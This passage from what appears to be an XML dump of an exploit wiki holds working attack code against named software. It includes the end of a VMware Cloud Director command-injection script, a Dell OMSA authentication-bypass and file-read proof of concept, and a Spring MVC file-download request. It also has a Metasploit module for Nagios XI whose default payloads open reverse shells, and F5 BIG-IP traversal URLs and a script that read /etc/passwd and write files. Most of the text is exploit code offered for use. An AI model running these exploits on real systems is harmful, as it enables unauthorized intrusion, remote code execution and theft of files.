		login_url = '%s://%s/login/%s'%(url.scheme, url.netloc, match.group(0))
		res = session.post(login_url, data={'username':username,'password':password})
		if res.status_code == 401:
			print('[!] invalid credentials')
			return (None,None,None,None)
	else:																				# Cloud Director 10.*
		match = re.search(r'/cloudapi/.*/sessions', res.content, re.IGNORECASE)
		if match:
			login_url = '%s://%s%s'%(url.scheme, url.netloc, match.group(0))
			headers = {
				'Authorization': 'Basic %s'%(base64.b64encode('%s@%s:%s'%(username,tenant,password))),
				'Accept': 'application/json;version=29.0',
				'Content-type': 'application/json;version=29.0'
			}
			res = session.post(login_url, headers=headers)
			if res.status_code == 401:
				print('[!] invalid credentials')
				return (None,None,None,None)
		else:
			print('[!] url for login form was not found')
			return (None,None,None,None)

	cookies = session.cookies.get_dict()
	jwt = cookies['vcloud_jwt']
	session_id = cookies['vcloud_session_id']

	if verbose:
		print('[*] jwt token: %s'%(jwt))
		print('[*] session_id: %s'%(session_id))

	res = session.get(target_url)
	match = re.search(r'organization : \'([^\']+)', res.content, re.IGNORECASE)
	if match is None:
		print('[!] organization not found')
		return (None,None,None,None)
	organization = match.group(1)
	if verbose:
		print('[*] organization name: %s'%(organization))

	match = re.search(r'orgId : \'([^\']+)', res.content)
	if match is None:
		print('[!] orgId not found')
		return (None,None,None,None)
	org_id = match.group(1)
	if verbose:
		print('[*] organization identifier: %s'%(org_id))

	return (jwt,session_id,organization,org_id)


def exploit(url, username, password, command, verbose):
	(jwt,session_id,organization,org_id) = login(url, username, password, verbose)
	if jwt is None:
		return

	headers = {
		'Accept': 'application/*+xml;version=29.0',
		'Authorization': 'Bearer %s'%jwt,
		'x-vcloud-authorization': session_id
	}
	admin_url = '%s://%s/api/admin/'%(url.scheme, url.netloc)
	res = session.get(admin_url, headers=headers)
	match = re.search(r'&lt;description&gt;\s*([^&lt;\s]+)', res.content, re.IGNORECASE)
	if match:
		version = match.group(1)
		if verbose:
			print('[*] detected version of Cloud Director: %s'%(version))
	else:
		version = None
		print('[!] can\'t find version of Cloud Director, assuming it is more than 10.0')

	email_settings_url = '%s://%s/api/admin/org/%s/settings/email'%(url.scheme, url.netloc, org_id)

	payload = PAYLOAD_TEMPLATE.replace('COMMAND', base64.b64encode('(%s) 2&gt;&amp;1'%command))
	data = '&lt;root:OrgEmailSettings xmlns:root="http://www.vmware.com/vcloud/v1.5"&gt;&lt;root:IsDefaultSmtpServer&gt;false&lt;/root:IsDefaultSmtpServer&gt;'
	data += '&lt;root:IsDefaultOrgEmail&gt;true&lt;/root:IsDefaultOrgEmail&gt;&lt;root:FromEmailAddress/&gt;&lt;root:DefaultSubjectPrefix/&gt;'
	data += '&lt;root:IsAlertEmailToAllAdmins&gt;true&lt;/root:IsAlertEmailToAllAdmins&gt;&lt;root:AlertEmailTo/&gt;&lt;root:SmtpServerSettings&gt;'
	data += '&lt;root:IsUseAuthentication&gt;false&lt;/root:IsUseAuthentication&gt;&lt;root:Host&gt;%s&lt;/root:Host&gt;&lt;root:Port&gt;25&lt;/root:Port&gt;'%(payload)
	data += '&lt;root:Username/&gt;&lt;root:Password/&gt;&lt;/root:SmtpServerSettings&gt;&lt;/root:OrgEmailSettings&gt;'
	res = session.put(email_settings_url, data=data, headers=headers)
	match = re.search(r'value:\s*\[([^\]]+)\]', res.content)

	if verbose:
		print('')
	try:
		print(base64.b64decode(match.group(1)))
	except Exception:
		print(res.content)


parser = argparse.ArgumentParser(usage='%(prog)s -t target -u username -p password [-c command] [--check]')
parser.add_argument('-v', action='store_true')
parser.add_argument('-t', metavar='target', help='url to html5 client (http://example.com/tenant/my_company)', required=True)
parser.add_argument('-u', metavar='username', required=True)
parser.add_argument('-p', metavar='password', required=True)
parser.add_argument('-c', metavar='command', help='command to execute', default='id')
args = parser.parse_args()

url = urlparse(args.t)
exploit(url, args.u, args.p, args.c, args.v)
&lt;/pre&gt;</text>
      <sha1>fdiqmnrfq2nllq3dnnpetiw1c85nb55</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-4006 VMware Workspace ONE Access 命令注入漏洞</title>
    <ns>0</ns>
    <id>2539</id>
    <revision>
      <id>3036</id>
      <timestamp>2021-05-22T02:21:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用== 漏洞位於 /cfg/ssl/installSelfSignedCertificate TLS端口8443上的 “Appliance Configurator” 服務中的端點中，通過san參數在POST對端點的..."</comment>
      <origin>3036</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="403" sha1="co6nty79x6b43u9uaibg7cnmim2nw9g" xml:space="preserve">==漏洞利用==
漏洞位於 /cfg/ssl/installSelfSignedCertificate TLS端口8443上的 “Appliance Configurator” 服務中的端點中，通過san參數在POST對端點的請求中指定惡意參數，可以執行任意shell命令。請注意該服務可能會重新啟動。活動會記錄在/opt/vmware/horizo​​n/workspace/logs/configurator.log文件中。

[[File:16215890003872.jpeg |600px]]</text>
      <sha1>co6nty79x6b43u9uaibg7cnmim2nw9g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5377 戴爾OMSA文件讀取漏洞</title>
    <ns>0</ns>
    <id>753</id>
    <revision>
      <id>997</id>
      <timestamp>2021-04-05T07:49:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # This is a proof of concept for CVE-2020-5377, an arbitrary file read in Dell OpenManage Administrator # Proof of concept written by: David Yesland @daveysec wi..."</comment>
      <origin>997</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4752" sha1="cgwa21tpapr3ryk8w1n72cv26at04gd" xml:space="preserve">==POC==
&lt;pre&gt;
# This is a proof of concept for CVE-2020-5377, an arbitrary file read in Dell OpenManage Administrator
# Proof of concept written by: David Yesland @daveysec with Rhino Security Labs
# More information can be found here: 
# A patch for this issue can be found here: 
# https://www.dell.com/support/article/en-us/sln322304/dsa-2020-172-dell-emc-openmanage-server-administrator-omsa-path-traversal-vulnerability

from xml.sax.saxutils import escape
import BaseHTTPServer
import requests
import thread
import ssl
import sys
import re
import os

import urllib3
urllib3.disable_warnings()

if len(sys.argv) &lt; 3:
	print 'Usage python auth_bypass.py &lt;yourIP&gt; &lt;targetIP&gt;:&lt;targetPort&gt;'
	exit()

#This XML to imitate a Dell OMSA remote system comes from https://www.exploit-db.com/exploits/39909
#Also check out https://github.com/hantwister/FakeDellOM
class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
	def do_POST(s):
		data = ''
		content_len = int(s.headers.getheader('content-length', 0))
		post_body = s.rfile.read(content_len)
		s.send_response(200)
		s.send_header("Content-type", "application/soap+xml;charset=UTF-8")
		s.end_headers()
		if "__00omacmd=getuserrightsonly" in post_body:
			data = escape("&lt;SMStatus&gt;0&lt;/SMStatus&gt;&lt;UserRightsMask&gt;458759&lt;/UserRightsMask&gt;")
		if "__00omacmd=getaboutinfo " in post_body:
			data = escape("&lt;ProductVersion&gt;6.0.3&lt;/ProductVersion&gt;")
		if data:
			requid = re.findall('&gt;uuid:(.*?)&lt;',post_body)[0]
			s.wfile.write('''&lt;?xml version="1.0" encoding="UTF-8"?&gt;
							&lt;s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:n1="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/DCIM_OEM_DataAccessModule"&gt;
							  &lt;s:Header&gt;
							    &lt;wsa:To&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/wsa:To&gt;
							    &lt;wsa:RelatesTo&gt;uuid:'''+requid+'''&lt;/wsa:RelatesTo&gt;
							    &lt;wsa:MessageID&gt;0d70cce2-05b9-45bb-b219-4fb81efba639&lt;/wsa:MessageID&gt;
							  &lt;/s:Header&gt;
							  &lt;s:Body&gt;
							    &lt;n1:SendCmd_OUTPUT&gt;
							      &lt;n1:ResultCode&gt;0&lt;/n1:ResultCode&gt;
							      &lt;n1:ReturnValue&gt;'''+data+'''&lt;/n1:ReturnValue&gt;
							    &lt;/n1:SendCmd_OUTPUT&gt;
							  &lt;/s:Body&gt;
							&lt;/s:Envelope&gt;''')

		else:
			s.wfile.write('''&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd"&gt;&lt;s:Header/&gt;&lt;s:Body&gt;&lt;wsmid:IdentifyResponse&gt;&lt;wsmid:ProtocolVersion&gt;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd&lt;/wsmid:ProtocolVersion&gt;&lt;wsmid:ProductVendor&gt;Fake Dell Open Manage Server Node&lt;/wsmid:ProductVendor&gt;&lt;wsmid:ProductVersion&gt;1.0&lt;/wsmid:ProductVersion&gt;&lt;/wsmid:IdentifyResponse&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;''')

	def log_message(self, format, *args):
		return

createdCert = False
if not os.path.isfile('./server.pem'):
	print '[-] No server.pem certifcate file found. Generating one...'
	os.system('openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj "/C=NO/ST=NONE/L=NONE/O=NONE/OU=NONE/CN=NONE.com"')
	createdCert = True

def startServer():
	server_class = BaseHTTPServer.HTTPServer
	httpd = httpd = server_class(('0.0.0.0', 443), MyHandler)
	httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
	httpd.serve_forever()

thread.start_new_thread(startServer,())

myIP = sys.argv[1]
target = sys.argv[2]

def bypassAuth():
	values = {}
	url = "https://{}/LoginServlet?flag=true&amp;managedws=false".format(target)
	data = {"manuallogin": "true", "targetmachine": myIP, "user": "VULNERABILITY:CVE-2020-5377", "password": "plz", "application": "omsa", "ignorecertificate": "1"}
	r = requests.post(url, data=data, verify=False, allow_redirects=False)
	cookieheader = r.headers['Set-Cookie']
	sessionid = re.findall('JSESSIONID=(.*?);',cookieheader)
	pathid = re.findall('Path=/(.*?);',cookieheader)
	values['sessionid'] = sessionid[0]
	values['pathid'] = pathid[0]
	return values

ids = bypassAuth()
sessionid = ids['sessionid']
pathid = ids['pathid']

print "Session: "+sessionid
print "VID: "+pathid

def readFile(target,sessid,pathid):
    while True:
        file = raw_input('file &gt; ')
        url = "https://{}/{}/DownloadServlet?help=Certificate&amp;app=oma&amp;vid={}&amp;file={}".format(target,pathid,pathid,file)
        cookies = {"JSESSIONID": sessid}
        r = requests.get(url, cookies=cookies, verify=False)
        print 'Reading contents of {}:\n{}'.format(file,r.content)

def getPath(path):
	if path.lower().startswith('c:\\'):
		path = path[2:]
        path = path.replace('\\','/')
        return path

readFile(target,sessionid,pathid)

&lt;/pre&gt;

==GIF==
[[File:OpenManage.gif]]</text>
      <sha1>cgwa21tpapr3ryk8w1n72cv26at04gd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5398 Spring MVC 反射文件下載漏洞</title>
    <ns>0</ns>
    <id>1494</id>
    <revision>
      <id>1875</id>
      <timestamp>2021-04-23T00:50:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==漏洞影響== Spring Framework 5.2.0 to 5.2.2，5.1.0 to 5.1.12，5.0.0 to 5.0.15  ==POC== &lt;pre&gt; GET /?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awh…」的新頁面</comment>
      <origin>1875</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="526" sha1="lapj3oyna8lu0d96ksb801jtoh8qr32" xml:space="preserve">==漏洞影響==
Spring Framework 5.2.0 to 5.2.2，5.1.0 to 5.1.12，5.0.0 to 5.0.15

==POC==
&lt;pre&gt;
GET /?filename=sample.sh%22%3B&amp;contents=%23!%2Fbin%2Fbash%0Awhoami%27%20--dump-header%20- HTTP/1.1 Host: 192.168.248.129:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1
&lt;/pre&gt;</text>
      <sha1>lapj3oyna8lu0d96ksb801jtoh8qr32</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5791 Nagios XI 5.7.3 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1382</id>
    <revision>
      <id>1746</id>
      <timestamp>2021-04-20T03:06:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==MSFEXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitMo..."</comment>
      <origin>1746</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6512" sha1="mx15rb10ip55gczuoo1r4eqz4xj9vac" xml:space="preserve">==MSFEXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection',
        'Description' =&gt; %q{
          This module exploits CVE-2020-5791, an OS command injection vulnerability in
          `admin/mibs.php` that enables an authenticated user with admin privileges to achieve
          remote code execution as either the `apache` user or the `www-data` user on NagiosXI
          version 5.6.0 to 5.7.3 inclusive (exact user depends on the version of NagiosXI
          installed as well as the OS its installed on).
 
          Valid credentials for a Nagios XI admin user are required. This module has
          been successfully tested against Nagios XI 5.7.3 running on CentOS 7.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Chris Lyne', # discovery
            'Matthew Aberegg', # PoC
            'Erik Wynter' # @wyntererik - Metasploit
          ],
        'References' =&gt;
          [
            ['CVE', '2020-5791'],
            ['EDB', '48959']
          ],
        'Platform' =&gt; %w[linux unix],
        'Arch' =&gt; [ ARCH_X86, ARCH_X64, ARCH_CMD ],
        'Targets' =&gt;
          [
            [
              'Linux (x86/x64)', {
                'Arch' =&gt; [ ARCH_X86, ARCH_X64 ],
                'Platform' =&gt; 'linux',
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'CMD', {
                'Arch' =&gt; [ ARCH_CMD ],
                'Platform' =&gt; 'unix',
                # the only reliable payloads against a typical Nagios XI host (CentOS 7 minimal) seem to be cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/unix/reverse_perl_ssl' }
              }
            ]
          ],
        'Privileged' =&gt; false,
        'DisclosureDate' =&gt; '2020-10-20',
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt;
          {
            'Stability' =&gt; [ CRASH_SAFE ],
            'SideEffects' =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
            'Reliability' =&gt; [ REPEATABLE_SESSION ]
          }
      )
    )
 
    register_options [
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])
    ]
  end
 
  def username
    datastore['USERNAME']
  end
 
  def password
    datastore['PASSWORD']
  end
 
  def finish_install
    datastore['FINISH_INSTALL']
  end
 
  def check
    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns
    # an array containing the http response body of a get request to index.php and the session cookies
    login_result, res_array = nagios_xi_login(username, password, finish_install)
    case login_result
    when 1..3 # An error occurred
      return CheckCode::Unknown(res_array[0])
    when 4 # Nagios XI is not fully installed
      install_result = install_nagios_xi(password)
      if install_result
        return CheckCode::Unknown(install_result[1])
      end
 
      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3 # An error occurred
        return CheckCode::Unknown(res_array[0])
      when 4 # Nagios XI is still not fully installed
        return CheckCode::Detected('Failed to install Nagios XI on the target.')
      end
    end
 
    # when 5 is excluded from the case statement above to prevent having to use this code block twice.
    # Including when 5 would require using this code block once at the end of the `when 4` code block above, and once here.
    if login_result == 5 # the Nagios XI license agreement has not been signed
      auth_cookies, nsp = res_array
      sign_license_result = sign_license_agreement(auth_cookies, nsp)
      if sign_license_result
        return CheckCode::Unknown(sign_license_result[1])
      end
 
      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3
        return CheckCode::Unknown(res_array[0])
      when 5 # the Nagios XI license agreement still has not been signed
        return CheckCode::Detected('Failed to sign the license agreement.')
      end
    end
 
    print_good('Successfully authenticated to Nagios XI')
 
    # Obtain the Nagios XI version
    @auth_cookies = res_array[1] # if we are here, this cannot be nil since the mixin checks for that already
 
    nagios_version = nagios_xi_version(res_array[0])
    if nagios_version.nil?
      return CheckCode::Detected('Unable to obtain the Nagios XI version from the dashboard')
    end
 
    print_status("Target is Nagios XI with version #{nagios_version}")
 
    if /^\d{4}R\d\.\d/.match(nagios_version) || /^\d{4}RC\d/.match(nagios_version) || /^\d{4}R\d.\d[A-Ha-h]/.match(nagios_version) || nagios_version == '5R1.0'
      nagios_version = '1.0.0' # Set to really old version as a placeholder. Basically we don't want to exploit these versions.
    end
 
    # check if the target is actually vulnerable
    version = Rex::Version.new(nagios_version)
    if version &gt;= Rex::Version.new('5.6.0') &amp;&amp; version &lt;= Rex::Version.new('5.7.3')
      return CheckCode::Appears
    end
 
    return CheckCode::Safe
  end
 
  def execute_command(cmd, _opts = {})
    # execute payload
    send_request_cgi({
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'mibs.php'),
      'cookie' =&gt; @auth_cookies,
      'vars_get' =&gt;
      {
        'mode' =&gt; 'undo-processing',
        'type' =&gt; '2',
        'file' =&gt; ";#{cmd};"
      }
    }, 0) # don't wait for a response from the target, otherwise the module will in most cases hang for a few seconds after executing the payload
  end
 
  def exploit
    if target.arch.first == ARCH_CMD
      print_status('Executing the payload')
      execute_command(payload.encoded)
    else
      execute_cmdstager(background: true)
    end
  end
end
&lt;/pre&gt;</text>
      <sha1>mx15rb10ip55gczuoo1r4eqz4xj9vac</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5902 F5 BIG-IP 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3723</id>
    <revision>
      <id>4318</id>
      <timestamp>2021-06-09T06:32:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; F5 BIG-IP 15.x: 15.1.0.4  F5 BIG-IP 14.x: 14.1.2.6  F5 BIG-IP 13.x: 13.1.3.4  F5 BIG-IP 12.x: 12.1.5.2  F5 BIG-I..."</comment>
      <origin>4318</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2610" sha1="eholwld7gbkhig0zidbf3o0k0lsiu1o" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;translate&gt;
===讀取文件===
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

&lt;translate&gt;
===寫入文件===
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>eholwld7gbkhig0zidbf3o0k0lsiu1o</sha1>
    </revision>
    <revision>
      <id>4319</id>
      <parentid>4318</parentid>
      <timestamp>2021-06-09T06:32:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4319</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2665" sha1="qwiy51anz6f7fgv9z991rlmpwldjw59" xml:space="preserve">&lt;languages /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;translate&gt;
===讀取文件=== &lt;!--T:3--&gt;
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

&lt;translate&gt;
===寫入文件=== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:5--&gt;
&lt;/translate&gt;
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>qwiy51anz6f7fgv9z991rlmpwldjw59</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5902 F5 BIG-IP 遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>3832</id>
    <revision>
      <id>4443</id>
      <timestamp>2021-06-09T10:03:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-5902 F5 BIG-IP remote code execution vulnerability"</comment>
      <origin>4443</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2486" sha1="5mx4qzav10ihfp3gh6n0z83tn5bnwlp" xml:space="preserve">&lt;languages /&gt;

==Vulnerability Impact==
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

F5 BIG-IP 14.x: 14.1.2.6

F5 BIG-IP 13.x: 13.1.3.4

F5 BIG-IP 12.x: 12.1.5.2

F5 BIG-IP 11.x: 11.6.5.2


&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="BIG-IP&amp;reg ;- Redirect"
&lt;/pre&gt;

==Exploit==
===Read file===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
&lt;/pre&gt;

===Write file===
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp

POST: fileName=/tmp/test.txt&amp;content=test
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: F5 BIG-IP                                                \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    version_url = target_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)
        if "output" in response.text:
            print("\033[32m[o] 目标 {} 存在漏洞，响应为:\n{}\033[0m".format(target_url, json.loads(response.text)["output"]))
        else:
            print("\033[31m[x] 目标漏洞无法利用 \033[0m")

    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 ,{}\033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)

&lt;/pre&gt;

==Reference==
https://short.pwnwiki.org/?c=Kum2Ch</text>
      <sha1>5mx4qzav10ihfp3gh6n0z83tn5bnwlp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-5902 F5 BIG-IP 遠程代碼執行漏洞/he</title>
    <ns>0</ns>
    <id>3827</id>
    <revision>
      <id>4438</id>
      <timestamp>2021-06-09T10:02:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "=== כתוב קובץ ==="</comment>
      <origin>4438</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2523" sha1="3cvukjf62my7e58ytps4321h11mguh4" xml:space="preserve">&lt;languages /&gt;

== השפעת פגיעות ==
&lt;pre&gt;
F5 BIG-IP 15.x: 15.1.0.4

